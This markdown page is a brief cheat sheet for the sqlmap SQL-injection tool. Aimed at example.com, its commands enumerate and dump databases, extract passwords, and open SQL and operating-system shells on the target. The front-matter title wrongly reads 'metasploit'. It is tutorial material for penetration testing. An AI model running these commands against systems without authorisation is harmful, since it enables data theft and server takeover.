---
title: "metasploit"
# search:
#   exclude: true

# hide:
#   - navigation
#   - toc
  #- footer
---

`sqlmap` is an open source automated penetration testing tool which can be used to detect and exploit SQL Injection flaws in a web application and potentially take over database servers.

It is a powerful tool that comes pre-installed in Kali Linux.

`URL_TARGET='http://www.example.com/form.php?id=123'`

`sqlmap -u ${URL_TARGET}`

The `URL_TARGET` must contain at least one parameter (example `?id=123`) in order to attempt different SQL injection methods.

example command  
`sqlmap -u 'http://www.example.com/form.php?id=123'`

If a vulnerability is found, you can use

* `--dbs` to list all databases

* `--tables` to list all tables  
`-T TABLE_NAME` to get the table information

* `--columns` to list all columns  
`-C COLUMN_NAME` to get the column information

* `--dump` to list all information

* `--sql-shell` to execute SQL queries

* `--os-shell` to access the underlying host operating system

* `sqlmap -h` help within the command

For more information and official documentation,  
check the official website at [https://sqlmap.org/](https://sqlmap.org/)

```bash
# sample from website

sqlmap -u 'http://www.example.com/form.php?id=123' --batch --banner

sqlmap -u 'http://www.example.com/form.php?id=123' --batch --passwords

sqlmap -u 'http://www.example.com/form.php?id=123' --batch --dbs

sqlmap -u 'http://www.example.com/form.php?id=123' --batch -D DATABASEBASE --all  # extracts all information from DB

sqlmap -u 'http://www.example.com/form.php?id=123' --batch --auth-type Basic --auth-cred "testuser:testpass"

sqlmap -u 'http://www.example.com/form.php?id=123' --batch --passwords

```

Exhaustive breakdown of all options and switches together with examples  
[https://github.com/sqlmapproject/sqlmap/wiki/Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

Other examples of code injection - [https://owasp.org/www-community/Injection_Flaws](https://owasp.org/www-community/Injection_Flaws)
